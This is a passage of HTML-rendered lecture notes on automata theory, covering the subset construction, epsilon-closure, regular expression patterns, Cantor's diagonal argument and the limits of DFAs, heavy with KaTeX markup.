<data class="katex-src" value="\hat{\Delta}(\bigcup_i A_i,x) = \bigcup_i \hat{\Delta}(A_i, x)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mo>⋃</mo><mi>i</mi></msub><msub><mi>A</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mo>⋃</mo><mi>i</mi></msub><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>A</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\Delta}(\bigcup_i A_i,x) = \bigcup_i \hat{\Delta}(A_i, x)</annotation></semantics></math></span></data></li>
</ul>
<p>Induction on |x|:</p>
<p>For |x| = 0, it is trivially true.</p>
<p>Assume for |x| ≤ n.</p>
<p><data class="katex-src" value="&#10;\begin{align*}&#10;\hat{\Delta}\left(\bigcup_i A_i, xa\right) & = &#10;\hat{\Delta}\left(\hat{\Delta}\left(\bigcup_i A_i,x\right),a\right) \\ & = &#10;\hat{\Delta}\left(\bigcup_i\hat{\Delta}\left(A_i, x\right),a\right) \\ & = &#10;\bigcup_i \hat{\Delta}\left(\hat{\Delta}\left(A_i , x\right), a\right) \\ & = &#10;\bigcup_i\hat{\Delta}\left(A_i, xa\right)&#10;\end{align*}&#10;"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><munder><mo>⋃</mo><mi>i</mi></munder><msub><mi>A</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>x</mi><mi>a</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><munder><mo>⋃</mo><mi>i</mi></munder><msub><mi>A</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>a</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><munder><mo>⋃</mo><mi>i</mi></munder><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>A</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>a</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mo>⋃</mo><mi>i</mi></munder><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>A</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>a</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mo>⋃</mo><mi>i</mi></munder><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>A</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>x</mi><mi>a</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex"> \begin{align*} \hat{\Delta}\left(\bigcup_i A_i, xa\right) &amp; =  \hat{\Delta}\left(\hat{\Delta}\left(\bigcup_i A_i,x\right),a\right) \ &amp; =  \hat{\Delta}\left(\bigcup_i\hat{\Delta}\left(A_i, x\right),a\right) \ &amp; =  \bigcup_i \hat{\Delta}\left(\hat{\Delta}\left(A_i , x\right), a\right) \ &amp; =  \bigcup_i\hat{\Delta}\left(A_i, xa\right) \end{align*} </annotation></semantics></math></span></data></p>
<p>Now the following two automata can be shown to accept the same set.</p>
<p><data class="katex-src" value="\left(Q, \Sigma, \Delta, S, F\right) = \left(2^Q, \Sigma, \hat{\Delta}, S, &#10;\{ A | A \subseteq Q, A \cap F ≠ \phi\} \right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">(</mo><mi>Q</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi mathvariant="normal">Δ</mi><mo separator="true">,</mo><mi>S</mi><mo separator="true">,</mo><mi>F</mi><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><msup><mn>2</mn><mi>Q</mi></msup><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mo separator="true">,</mo><mi>S</mi><mo separator="true">,</mo><mo stretchy="false">{</mo><mi>A</mi><mi mathvariant="normal">∣</mi><mi>A</mi><mo>⊆</mo><mi>Q</mi><mo separator="true">,</mo><mi>A</mi><mo>∩</mo><mi>F</mi><mo mathvariant="normal">≠</mo><mi>ϕ</mi><mo stretchy="false">}</mo><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\left(Q, \Sigma, \Delta, S, F\right) = \left(2^Q, \Sigma, \hat{\Delta}, S,  { A | A \subseteq Q, A \cap F ≠ \phi} \right)</annotation></semantics></math></span></data></p>
<p>To create a minimal DFA from an NFA, check the decision tree for the NFA and
do a BFS, stopping when you don’t get any new states.</p>
<h4 id="ϵepsilon-transition"><a class="header" href="#ϵepsilon-transition"><data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data> transition</a></h4>
<p>This has an <data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data> slip that allows the state to transition without
reading any input symbol.</p>
<blockquote>
<p>Proof that <data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data> transition NFA’s have an equivalent NFA with just one
start state and no <data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data> transitions.</p>
</blockquote>
<p><strong>Defn:</strong> <data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data> closure: The set of all states that a state can reach on
an <data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data> transition.</p>
<p>Define a new transition function such that the states attained by the state
with <data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data> transitions further take one symbol.</p>
<p>For an <data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data> NFA to be converted to a regular NFA, we define</p>
<p><data class="katex-src" value="\begin{align*}&#10;\Delta'\left(q,\sigma\right) = \bigcup_{q'\in \epsilon(q)}&#10;\Delta\left(q', \sigma\right)&#10;\end{align*}&#10;"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right" columnspacing=""><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><msup><mi mathvariant="normal">Δ</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mrow><mo fence="true">(</mo><mi>q</mi><mo separator="true">,</mo><mi>σ</mi><mo fence="true">)</mo></mrow><mo>=</mo><munder><mo>⋃</mo><mrow><msup><mi>q</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∈</mo><mi>ϵ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow></munder><mi mathvariant="normal">Δ</mi><mrow><mo fence="true">(</mo><msup><mi>q</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi>σ</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*} \Delta'\left(q,\sigma\right) = \bigcup_{q'\in \epsilon(q)} \Delta\left(q', \sigma\right) \end{align*} </annotation></semantics></math></span></data></p>
<p>where <data class="katex-src" value="\epsilon(q)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon(q)</annotation></semantics></math></span></data> is the <data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data> closure of q.</p>
<p>The final states</p>
<p><data class="katex-src" value="&#10;F' = \{q | \epsilon(q)\cap F \neq \phi\}&#10;"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>F</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">{</mo><mi>q</mi><mi mathvariant="normal">∣</mi><mi>ϵ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo><mo>∩</mo><mi>F</mi><mo mathvariant="normal">≠</mo><mi>ϕ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex"> F' = {q | \epsilon(q)\cap F \neq \phi} </annotation></semantics></math></span></data></p>
<p>Everything else remains the same.</p>
<h2 id="pattern-matching"><a class="header" href="#pattern-matching">Pattern Matching</a></h2>
<ul>
<li><data class="katex-src" value="a"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span></data> for each <data class="katex-src" value="a \in \Sigma"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>∈</mo><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">a \in \Sigma</annotation></semantics></math></span></data>, matched by <data class="katex-src" value="a"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span></data> only.</li>
<li><data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data>, matched by the empty string.</li>
<li><data class="katex-src" value="\phi"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span></data>, matched by nothing.</li>
<li>#, matched by any symbol in <data class="katex-src" value="\Sigma"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span></data>.</li>
<li><data class="katex-src" value="@"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">@</mi></mrow><annotation encoding="application/x-tex">@</annotation></semantics></math></span></data>, matched by anything in <data class="katex-src" value="\Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\Sigma^*</annotation></semantics></math></span></data>.</li>
</ul>
<h3 id="combining-patterns"><a class="header" href="#combining-patterns">Combining patterns</a></h3>
<ul>
<li><data class="katex-src" value="x"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span></data> matches <data class="katex-src" value="\alpha + \beta"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>+</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">\alpha + \beta</annotation></semantics></math></span></data> if <data class="katex-src" value="x"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span></data> matches either of those.</li>
<li><data class="katex-src" value="x"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span></data> matches <data class="katex-src" value="\alpha\cap\beta"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>∩</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">\alpha\cap\beta</annotation></semantics></math></span></data> if <data class="katex-src" value="x"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span></data> matches both of them.</li>
<li><data class="katex-src" value="x"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span></data> matches <data class="katex-src" value="\alpha\beta"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">\alpha\beta</annotation></semantics></math></span></data> if <data class="katex-src" value="x"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span></data> matches <data class="katex-src" value="\alpha"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span></data> followed by <data class="katex-src" value="\beta"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span></data>.</li>
<li><data class="katex-src" value="x"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span></data> matches <data class="katex-src" value="~\alpha"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext> </mtext><mi>α</mi></mrow><annotation encoding="application/x-tex">~\alpha</annotation></semantics></math></span></data> if it doesn’t match <data class="katex-src" value="\alpha"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span></data>.</li>
<li><data class="katex-src" value="x"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span></data> matches <data class="katex-src" value="\alpha^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>α</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\alpha^*</annotation></semantics></math></span></data> and <data class="katex-src" value="\alpha^+"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>α</mi><mo>+</mo></msup></mrow><annotation encoding="application/x-tex">\alpha^+</annotation></semantics></math></span></data> the same way as regex.</li>
</ul>
<p>NOTE:<br>
<data class="katex-src" value="\left(0 + 1\right)^* "><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mrow><mo fence="true">(</mo><mn>0</mn><mo>+</mo><mn>1</mn><mo fence="true">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\left(0 + 1\right)^* </annotation></semantics></math></span></data> accepts 010101<br>
<data class="katex-src" value=" 0^* + 1^* "><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>0</mn><mo>∗</mo></msup><mo>+</mo><msup><mn>1</mn><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex"> 0^* + 1^* </annotation></semantics></math></span></data> accepts 000000 or 111111 but only strings of one symbol</p>
<p>For any pattern <data class="katex-src" value="R"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span></data>, we define <data class="katex-src" value="L(R)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(R)</annotation></semantics></math></span></data> to be the language that matches the
pattern <data class="katex-src" value="R"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span></data>.</p>
<p>Any regular language can have countably infinite representations in form of
patterns.</p>
<p><strong>Theorem</strong>: If <data class="katex-src" value="R"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span></data> is a regular expression, then <data class="katex-src" value="L(R)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(R)</annotation></semantics></math></span></data> is regular.</p>
<p>Proof: Check for each possible case and all of them can be decomposed into a
combination of the above situations.</p>
<blockquote>
<p>It is always possible to remove the complement in a regular expression.</p>
</blockquote>
<h3 id="dfas-to-regex"><a class="header" href="#dfas-to-regex">DFAs to Regex</a></h3>
<ul>
<li>State elimination
<ul>
<li>Keep remaining states</li>
<li>Replace transitions with transitions labelled as regex.</li>
<li>while true</li>
</ul>
</li>
</ul>
<h2 id="class"><a class="header" href="#class">Class</a></h2>
<p><strong>Theorem:</strong> Set of all C Programs is countable.</p>
<p>Proof: <br></p>
<p>Represent the ascii source code in binary. Then it will be a subset of
<data class="katex-src" value="\{0,1\}^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">{0,1}^*</annotation></semantics></math></span></data> and that is bijective with the natural numbers
(<data class="katex-src" value="n(b) + 2^{|b|} -1"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>b</mi><mo stretchy="false">)</mo><mo>+</mo><msup><mn>2</mn><mrow><mi mathvariant="normal">∣</mi><mi>b</mi><mi mathvariant="normal">∣</mi></mrow></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n(b) + 2^{|b|} -1</annotation></semantics></math></span></data>). It is also obviously infinite.</p>
<blockquote>
<p>Hilbert’s Entscheidungs Problem: Given a mathematical statement, is
it derivable from the axioms?</p>
</blockquote>
<p><strong>Defn:</strong> A language <data class="katex-src" value="L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></data> over an alphabet <data class="katex-src" value="\Sigma"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span></data> is a subset of <data class="katex-src" value="\Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\Sigma^*</annotation></semantics></math></span></data>.</p>
<p><strong>Theorem:</strong> The cardinality of all the languages over some alphabet is
uncountably infinite, i.e., <data class="katex-src" value="\left|\mathcal{P}\left(L\right)\right| >&#10;\left|\mathbb{N}\right|"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">∣</mo><mi mathvariant="script">P</mi><mrow><mo fence="true">(</mo><mi>L</mi><mo fence="true">)</mo></mrow><mo fence="true">∣</mo></mrow><mo>&gt;</mo><mrow><mo fence="true">∣</mo><mi mathvariant="double-struck">N</mi><mo fence="true">∣</mo></mrow></mrow><annotation encoding="application/x-tex">\left|\mathcal{P}\left(L\right)\right| &gt; \left|\mathbb{N}\right|</annotation></semantics></math></span></data>.</p>
<p>Proof:</p>
<p>Cantor’s argument:</p>
<p>Set of all languages = <data class="katex-src" value="\mathcal{P}\left(\{0,1\}^*\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">P</mi><mrow><mo fence="true">(</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>∗</mo></msup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathcal{P}\left({0,1}^*\right)</annotation></semantics></math></span></data></p>
<div class="table-wrapper"><table><thead><tr><th>input</th><th><data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data></th><th>0</th><th>1</th><th>00</th></tr></thead><tbody>
<tr><td>f(<data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data>)</td><td>1</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>f(0)</td><td>1</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>f(1)</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>f(01)</td><td>1</td><td>1</td><td>0</td><td>1</td></tr>
</tbody></table>
</div>
<p>The entries in the table tell whether that particular element is present in the
subset is obtained from the result or not.</p>
<p>Take the diagonal and bit flip all bits. It will differ from all the strings in
the table by atleast one bit.</p>
<p>Go to <a href="notes/./cs2200.html#cs2200">top</a> till
<a href="notes/./cs2200.html#deterministic-finite-automata">Deterministic Finite Automata</a>
along with a few examples of languages based on the problem.</p>
<h3 id="limits-of-dfas"><a class="header" href="#limits-of-dfas">Limits of DFAs</a></h3>
<ul>
<li>DFAs have finite memory.</li>
<li>They can also only read one symbol at a time from left to right.</li>
</ul>
<p>For instance, there is no way of constructing a DFA that can accept <data class="katex-src" value="L =&#10;\{0^n1^n | n \in \mathbb{N}\}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mo stretchy="false">{</mo><msup><mn>0</mn><mi>n</mi></msup><msup><mn>1</mn><mi>n</mi></msup><mi mathvariant="normal">∣</mi><mi>n</mi><mo>∈</mo><mi mathvariant="double-struck">N</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">L = {0^n1^n | n \in \mathbb{N}}</annotation></semantics></math></span></data>.</p>
<p>Similarly, there is no DFA that can accept the language <data class="katex-src" value="L = \{0^{2^n}| n&#10;\in \mathbb{N}\}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mo stretchy="false">{</mo><msup><mn>0</mn><msup><mn>2</mn><mi>n</mi></msup></msup><mi mathvariant="normal">∣</mi><mi>n</mi><mo>∈</mo><mi mathvariant="double-struck">N</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">L = {0^{2^n}| n \in \mathbb{N}}</annotation></semantics></math></span></data></p>
<blockquote>
<p>Important Proof</p>
</blockquote>
<p>If <data class="katex-src" value="L"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span></data> is regular, where <data class="katex-src" value="L = \{ww | w \in \Sigma^* \}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mo stretchy="false">{</mo><mi>w</mi><mi>w</mi><mi mathvariant="normal">∣</mi><mi>w</mi><mo>∈</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">L = {ww | w \in \Sigma^* }</annotation></semantics></math></span></data>, then <data class="katex-src" value="\sqrt{L}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mi>L</mi></msqrt></mrow><annotation encoding="application/x-tex">\sqrt{L}</annotation></semantics></math></span></data> is
also regular.</p>
<p>Proof:</p>
<p>Let the DFA be <data class="katex-src" value="\left(Q, \Sigma, \delta, q_0, F\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><mi>Q</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi>δ</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left(Q, \Sigma, \delta, q_0, F\right)</annotation></semantics></math></span></data>. We define the
NFA as follows:</p>
<p><data class="katex-src" value="N = \left(Q \times Q \times Q, \Sigma, \Delta, A, f\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>N</mi><mo>=</mo><mrow><mo fence="true">(</mo><mi>Q</mi><mo>×</mo><mi>Q</mi><mo>×</mo><mi>Q</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi mathvariant="normal">Δ</mi><mo separator="true">,</mo><mi>A</mi><mo separator="true">,</mo><mi>f</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">N = \left(Q \times Q \times Q, \Sigma, \Delta, A, f\right)</annotation></semantics></math></span></data></p>
<p>where</p>
<p><data class="katex-src" value="\begin{align}&#10;A &= \bigcup_{i\in Q} {\left(i, q_0, i\right)}&#10;\\&#10;f &= \bigcup_{i \in Q\atop z\in F} {\left(i, i, z\right)}&#10;\\&#10;\Delta\left(\left(i, \alpha, \beta\right), a_0\right) &= \left(i, &#10;\delta\left(\alpha, a_0\right), \delta\left(\beta, a_0\right)\right)&#10;\end{align}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>A</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mo>⋃</mo><mrow><mi>i</mi><mo>∈</mo><mi>Q</mi></mrow></munder><mrow><mo fence="true">(</mo><mi>i</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>i</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd class ="mtr-glue"></mtd><mtd class ="mml-eqn-num"></mtd></mtr><mtr><mtd class ="mtr-glue"></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>f</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mo>⋃</mo><mfrac linethickness="0px"><mrow><mi>i</mi><mo>∈</mo><mi>Q</mi></mrow><mrow><mi>z</mi><mo>∈</mo><mi>F</mi></mrow></mfrac></munder><mrow><mo fence="true">(</mo><mi>i</mi><mo separator="true">,</mo><mi>i</mi><mo separator="true">,</mo><mi>z</mi><mo 